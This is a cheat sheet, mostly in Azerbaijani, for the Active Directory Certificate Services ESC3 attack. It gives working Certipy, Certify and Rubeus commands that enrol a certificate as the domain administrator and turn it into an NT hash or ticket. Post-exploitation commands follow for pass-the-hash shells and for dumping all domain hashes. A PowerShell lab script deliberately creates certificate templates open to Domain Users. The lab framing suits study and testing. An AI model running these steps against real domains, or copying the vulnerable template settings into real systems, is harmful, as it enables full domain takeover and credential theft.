# ESC3 — Certificate Request Agent Abuse

---

## ESC3 Nədir?

ESC3 iki ayrı şablonun birlikdə istifadə edilməsinə əsaslanır:

- **Condition 1** — `Certificate Request Agent` EKU-su olan şablon: hücumçu
  bu şablondan bir *enrollment agent* sertifikatı alır.
- **Condition 2** — `msPKI-RA-Signature >= 1` olan şablon: bu şablon
  enrollment agent sertifikatı ilə başqası adından (on-behalf-of) enroll
  edilməsinə icazə verir.

Hücumçu öz istifadəçi hesabıyla bu iki şablonu ardıcıl istifadə edərək
Domain Admin adına Client Authentication sertifikatı alır.

---

## ESC3 Condition 1 — Enrollment Agent Şablonu

```
EKU                           -    Certificate Request Agent (1.3.6.1.4.1.311.20.2.1)
Broad enrollment permit        -    Domain Users, Authenticated Users və ya digər geniş qruplar
Manager approval not required  -    Sertifikat avtomatik verilir
msPKI-RA-Signature             -    0  (enrollment agent sertifikatı tələb olunmur)
```

### Condition 1 Flags

```powershell
pKIExtendedKeyUsage      -    1.3.6.1.4.1.311.20.2.1    # Certificate Request Agent
msPKI-Enrollment-Flag    -    0x0                        # Manager approval yoxdur
msPKI-RA-Signature       -    0
```

---

## ESC3 Condition 2 — On-Behalf-Of Hədəf Şablonu

```
EKU                           -    Client Authentication (1.3.6.1.5.5.7.3.2) və ya Any Purpose
msPKI-RA-Signature             -    >= 1  (enrollment agent sertifikatı tələb edir)
CT_FLAG_ALLOW_ENROLL_ON_BEHALF_OF  -  0x800 in msPKI-Enrollment-Flag
Manager approval not required  -    Avtomatik verilir
Broad enrollment permit        -    Domain Users, Authenticated Users və ya digər geniş qruplar
```

### Condition 2 Flags

```powershell
pKIExtendedKeyUsage          -    1.3.6.1.5.5.7.3.2    # Client Authentication
msPKI-RA-Signature           -    1 (və ya daha çox)
msPKI-Enrollment-Flag        -    0x800                 # CT_FLAG_ALLOW_ENROLL_ON_BEHALF_OF
```

---

## ESC3 Enumeration

```powershell
# Certipy — hər iki condition-u eyni anda aşkar edir
certipy-ad find -u 'test@certificate.local' -p 'sako2005!' \
    -dc-ip 192.168.0.150 \
    -ldap-scheme ldap \
    -stdout

# Certify.exe
Certify.exe find /vulnerable
Certify.exe find /vulnerable /ca:"CA-Server\CA-Name"
```

---

## ESC3 Enumeration With LDAP

```powershell
# Condition 1 — Certificate Request Agent EKU olan şablonlar
ldapsearch -x -H ldap://dc.domain.local \
  -D "user@domain.local" -w 'Password123' \
  -b "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" \
  "(pKIExtendedKeyUsage=1.3.6.1.4.1.311.20.2.1)" \
  name msPKI-Enrollment-Flag msPKI-RA-Signature pKIExtendedKeyUsage

# Condition 2 — msPKI-RA-Signature >= 1 olan şablonlar
ldapsearch -x -H ldap://dc.domain.local \
  -D "user@domain.local" -w 'Password123' \
  -b "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" \
  "(&(objectClass=pKICertificateTemplate)(msPKI-RA-Signature=1))" \
  name msPKI-Enrollment-Flag msPKI-RA-Signature pKIExtendedKeyUsage
```

---

## ESC3 Exploitation with Certipy

```powershell
# Step 1 — Condition 1 şablonundan Enrollment Agent sertifikatı al
certipy-ad req -u 'test@certificate.local' -p 'sako2005!' \
    -dc-ip 192.168.0.150 \
    -target 192.168.0.150 \
    -ca 'certificate-WIN-CERTIFICATE-CA' \
    -template 'VulnESC3-Cond1' \
    -ldap-scheme ldap

# Output: test.pfx  (enrollment agent sertifikatı)

# Step 2 — Həmin sertifikatı istifadə edərək Domain Admin adına
#           Condition 2 şablonundan sertifikat al
certipy-ad req -u 'test@certificate.local' -p 'sako2005!' \
    -dc-ip 192.168.0.150 \
    -target 192.168.0.150 \
    -ca 'certificate-WIN-CERTIFICATE-CA' \
    -template 'VulnESC3-Cond2' \
    -on-behalf-of 'certificate\administrator' \
    -pfx test.pfx \
    -ldap-scheme ldap

# Output: administrator.pfx

# Step 3 — NT Hash al
certipy-ad auth \
    -pfx administrator.pfx \
    -dc-ip 192.168.0.150

# Step 3 (alternativ) — TGT al
certipy-ad auth \
    -pfx administrator.pfx \
    -domain certificate.local \
    -dc-ip 192.168.0.150
```

---

## ESC3 Exploitation With Certify and Rubeus

```powershell
# Step 1 — Enrollment Agent sertifikatı al (Condition 1)
Certify.exe request /ca:"CA-Server\CA-Name" /template:"VulnESC3-Cond1"

# Convert PEM → PFX (Linux)
openssl pkcs12 -in agent_cert.pem \
    -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" \
    -export -out agent.pfx

# Step 2 — Agent sertifikatı ilə Domain Admin adına enroll et (Condition 2)
Certify.exe request /ca:"CA-Server\CA-Name" \
    /template:"VulnESC3-Cond2" \
    /onbehalfof:"DOMAIN\administrator" \
    /enrollcert:agent.pfx \
    /enrollcertpwd:''

# Convert PEM → PFX (Linux)
openssl pkcs12 -in admin_cert.pem \
    -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" \
    -export -out admin.pfx

# Step 3 — TGT al
Rubeus.exe asktgt /user:administrator \
    /certificate:admin.pfx \
    /password:'' /ptt

# Yoxla
klist
whoami /all
```

---

## Post Exploitation

```powershell
# SMB with NT Hash
impacket-psexec  -hashes ':NTHash' administrator@dc.domain.local
impacket-smbexec -hashes ':NTHash' administrator@dc.domain.local
impacket-wmiexec -hashes ':NTHash' administrator@dc.domain.local

# Dump all hashes
impacket-secretsdump -hashes ':NTHash' administrator@dc.domain.local

# CrackMapExec
crackmapexec smb 10.10.10.10 -u administrator -H NTHash --shares
crackmapexec smb 10.10.10.10 -u administrator -H NTHash -x "whoami"

# Evil-WinRM
evil-winrm -i 10.10.10.10 -u administrator -H NTHash
```

---

## Laboratory

```powershell
#Requires -RunAsAdministrator
<#
.SYNOPSIS
    ESC3 Vulnerable Lab Setup Script
    İki şablon yaradır:
      VulnESC3-Cond1 — Certificate Request Agent EKU (Condition 1)
      VulnESC3-Cond2 — msPKI-RA-Signature=1, Client Auth (Condition 2)

.DESCRIPTION
    Hər iki şablon birlikdə ESC3 hücumunu simulyasiya edir.
    Kifayətsiz icazə halında SYSTEM kimi işlət:
        PsExec64.exe -s -i powershell.exe .\Setup-ESC3Lab.ps1

.NOTES
    For authorized lab/testing use only.
#>

# ── Config ────────────────────────────────────────────────────────────────────

$Cond1Name  = "VulnESC3-Cond1"
$Cond2Name  = "VulnESC3-Cond2"
$Cond1OID   = "1.3.6.1.4.1.311.21.8.1417189.1978403.869562.7555284.2956879.9.1.300"
$Cond2OID   = "1.3.6.1.4.1.311.21.8.1417189.1978403.869562.7555284.2956879.9.1.301"
$EnrollGroup = "Domain Users"

# ── Helpers ───────────────────────────────────────────────────────────────────

function Write-Step { param($msg) Write-Host "[*] $msg" -ForegroundColor Cyan }
function Write-Ok   { param($msg) Write-Host "[+] $msg" -ForegroundColor Green }
function Write-Fail { param($msg) Write-Host "[-] $msg" -ForegroundColor Red }
function Write-Warn { param($msg) Write-Host "[!] $msg" -ForegroundColor Yellow }

function Grant-Enroll {
    param($TemplateName, $TemplatePath, $Group)
    try {
        $acl  = Get-Acl "AD:\CN=$TemplateName,$TemplatePath"
        $rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
            [System.Security.Principal.NTAccount]$Group,
            "ExtendedRight",
            "Allow"
        )
        $acl.AddAccessRule($rule)
        Set-Acl -Path "AD:\CN=$TemplateName,$TemplatePath" -AclObject $acl -ErrorAction Stop
        Write-Ok "Enroll permission granted to '$Group' on '$TemplateName'."
    } catch {
        Write-Fail "Failed to set ACL on '$TemplateName': $_"
        exit 1
    }
}

# ── Preflight ─────────────────────────────────────────────────────────────────

Write-Host ""
Write-Host "  ESC3 Lab Setup" -ForegroundColor Magenta
Write-Host "  ──────────────────────────────────────" -ForegroundColor DarkGray
Write-Host ""

Write-Step "Checking environment..."

try {
    $configNC     = (Get-ADRootDSE).configurationNamingContext
    $templatePath = "CN=Certificate Templates,CN=Public Key Services,CN=Services,$configNC"
    Write-Ok "Config NC: $configNC"
} catch {
    Write-Fail "Cannot reach AD. Is this a Domain Controller?"
    exit 1
}

# ── Cleanup existing ──────────────────────────────────────────────────────────

foreach ($name in @($Cond1Name, $Cond2Name)) {
    $existing = Get-ADObject -Filter { Name -eq $name } -SearchBase $templatePath -ErrorAction SilentlyContinue
    if ($existing) {
        Write-Warn "Existing '$name' template found. Removing..."
        try {
            certutil -SetCATemplates -$name 2>$null | Out-Null
            Remove-ADObject "CN=$name,$templatePath" -Confirm:$false -ErrorAction Stop
            Write-Ok "Old '$name' template removed."
        } catch {
            Write-Fail "Could not remove '$name': $_"
            Write-Warn "Run as SYSTEM: PsExec64.exe -s -i powershell.exe .\Setup-ESC3Lab.ps1"
            exit 1
        }
    }
}

# ── Create Condition 1 template ───────────────────────────────────────────────
# Certificate Request Agent EKU, msPKI-RA-Signature=0, no approval

Write-Step "Creating Condition 1 template: $Cond1Name"

$attrsC1 = @{
    "displayName"                          = $Cond1Name
    "msPKI-Cert-Template-OID"              = $Cond1OID
    "msPKI-Certificate-Name-Flag"          = 0
    "msPKI-Enrollment-Flag"                = 0          # No manager approval
    "msPKI-Minimal-Key-Size"               = 2048
    "msPKI-Private-Key-Flag"               = 16         # Exportable
    "msPKI-RA-Signature"                   = 0          # No agent cert required
    "msPKI-Template-Schema-Version"        = 2
    "msPKI-Template-Minor-Revision"        = 0
    "msPKI-Certificate-Application-Policy" = "1.3.6.1.4.1.311.20.2.1"   # Certificate Request Agent
    "pKIExtendedKeyUsage"                  = "1.3.6.1.4.1.311.20.2.1"   # Certificate Request Agent
    "pKIDefaultKeySpec"                    = 2
    "pKIMaxIssuingDepth"                   = 0
    "pKIKeyUsage"                          = [byte[]]@(0x80, 0x00)
    "pKIDefaultCSPs"                       = "1,Microsoft Enhanced Cryptographic Provider v1.0"
    "pKIExpirationPeriod"                  = [byte[]]@(0x00, 0x40, 0x39, 0x87, 0x2e, 0x2b, 0xfe, 0xff)
    "pKIOverlapPeriod"                     = [byte[]]@(0x00, 0x80, 0xa6, 0x0a, 0xff, 0xff, 0xff, 0xff)
    "flags"                                = 131104
    "revision"                             = 100
}

try {
    New-ADObject -Name $Cond1Name -Path $templatePath -Type "pKICertificateTemplate" `
                 -OtherAttributes $attrsC1 -ErrorAction Stop
    Write-Ok "Condition 1 template created."
} catch {
    Write-Fail "Failed to create Condition 1 template: $_"
    exit 1
}

Grant-Enroll -TemplateName $Cond1Name -TemplatePath $templatePath -Group $EnrollGroup

# ── Create Condition 2 template ───────────────────────────────────────────────
# Client Auth EKU, msPKI-RA-Signature=1, CT_FLAG_ALLOW_ENROLL_ON_BEHALF_OF

Write-Step "Creating Condition 2 template: $Cond2Name"

$attrsC2 = @{
    "displayName"                          = $Cond2Name
    "msPKI-Cert-Template-OID"              = $Cond2OID
    "msPKI-Certificate-Name-Flag"          = 0
    "msPKI-Enrollment-Flag"                = 0x800      # CT_FLAG_ALLOW_ENROLL_ON_BEHALF_OF
    "msPKI-Minimal-Key-Size"               = 2048
    "msPKI-Private-Key-Flag"               = 16         # Exportable
    "msPKI-RA-Signature"                   = 1          # Enrollment agent cert required
    "msPKI-Template-Schema-Version"        = 2
    "msPKI-Template-Minor-Revision"        = 0
    "msPKI-Certificate-Application-Policy" = "1.3.6.1.5.5.7.3.2"   # Client Authentication
    "pKIExtendedKeyUsage"                  = "1.3.6.1.5.5.7.3.2"   # Client Authentication
    "pKIDefaultKeySpec"                    = 1
    "pKIMaxIssuingDepth"                   = 0
    "pKIKeyUsage"                          = [byte[]]@(0x80, 0x00)
    "pKIDefaultCSPs"                       = "1,Microsoft Enhanced Cryptographic Provider v1.0"
    "pKIExpirationPeriod"                  = [byte[]]@(0x00, 0x40, 0x39, 0x87, 0x2e, 0x2b, 0xfe, 0xff)
    "pKIOverlapPeriod"                     = [byte[]]@(0x00, 0x80, 0xa6, 0x0a, 0xff, 0xff, 0xff, 0xff)
    "flags"                                = 131104
    "revision"                             = 100
}

try {
    New-ADObject -Name $Cond2Name -Path $templatePath -Type "pKICertificateTemplate" `
                 -OtherAttributes $attrsC2 -ErrorAction Stop
    Write-Ok "Condition 2 template created."
} catch {
    Write-Fail "Failed to create Condition 2 template: $_"
    exit 1
}

Grant-Enroll -TemplateName $Cond2Name -TemplatePath $templatePath -Group $EnrollGroup

# ── Add both templates to CA ──────────────────────────────────────────────────

Write-Step "Adding templates to CA..."

foreach ($name in @($Cond1Name, $Cond2Name)) {
    $result = certutil -SetCATemplates +$name 2>&1
    if ($LASTEXITCODE -eq 0) {
        Write-Ok "'$name' added to CA."
    } else {
        Write-Warn "certutil failed for '$name', trying Add-CATemplate..."
        try {
            Add-CATemplate -Name $name -Force -ErrorAction Stop
            Write-Ok "'$name' added via Add-CATemplate."
        } catch {
            Write-Fail "Could not add '$name' to CA: $_"
            exit 1
        }
    }
}

# ── Restart CertSvc ───────────────────────────────────────────────────────────

Write-Step "Restarting CertSvc..."
Restart-Service -Name CertSvc -Force
Start-Sleep -Seconds 5
Write-Ok "CertSvc restarted."

# ── Summary ───────────────────────────────────────────────────────────────────

$domain = (Get-ADDomain).DNSRoot
$dcIP   = (Resolve-DnsName $domain -Type A -ErrorAction SilentlyContinue | Select-Object -First 1).IPAddress

Write-Host ""
Write-Host "  ──────────────────────────────────────" -ForegroundColor DarkGray
Write-Host "  ESC3 Lab Ready" -ForegroundColor Green
Write-Host "  ──────────────────────────────────────" -ForegroundColor DarkGray
Write-Host ""
Write-Host "  Condition 1 Template : $Cond1Name" -ForegroundColor White
Write-Host "    EKU                : Certificate Request Agent" -ForegroundColor White
Write-Host "    RA Signature       : 0" -ForegroundColor White
Write-Host ""
Write-Host "  Condition 2 Template : $Cond2Name" -ForegroundColor White
Write-Host "    EKU                : Client Authentication" -ForegroundColor White
Write-Host "    RA Signature       : 1" -ForegroundColor White
Write-Host "    Enroll On-Behalf-Of: CT_FLAG_ALLOW_ENROLL_ON_BEHALF_OF" -ForegroundColor White
Write-Host ""
Write-Host "  Exploit (from Kali):" -ForegroundColor Yellow
Write-Host ""
Write-Host "  # Step 1 — Enrollment Agent sertifikatı al" -ForegroundColor DarkGray
Write-Host "  certipy req -u 'lowuser@$domain' -p 'PASSWORD' \`" -ForegroundColor Cyan
Write-Host "      -dc-ip $dcIP -target $dcIP \`" -ForegroundColor Cyan
Write-Host "      -ca '<CA-NAME>' -template '$Cond1Name' \`" -ForegroundColor Cyan
Write-Host "      -ldap-scheme ldap" -ForegroundColor Cyan
Write-Host ""
Write-Host "  # Step 2 — Admin adına enroll et" -ForegroundColor DarkGray
Write-Host "  certipy req -u 'lowuser@$domain' -p 'PASSWORD' \`" -ForegroundColor Cyan
Write-Host "      -dc-ip $dcIP -target $dcIP \`" -ForegroundColor Cyan
Write-Host "      -ca '<CA-NAME>' -template '$Cond2Name' \`" -ForegroundColor Cyan
Write-Host "      -on-behalf-of '$($domain.Split('.')[0])\administrator' \`" -ForegroundColor Cyan
Write-Host "      -pfx lowuser.pfx -ldap-scheme ldap" -ForegroundColor Cyan
Write-Host ""
Write-Host "  # Step 3 — Authenticate" -ForegroundColor DarkGray
Write-Host "  certipy auth -pfx 'administrator.pfx' -dc-ip $dcIP" -ForegroundColor Cyan
Write-Host ""
```
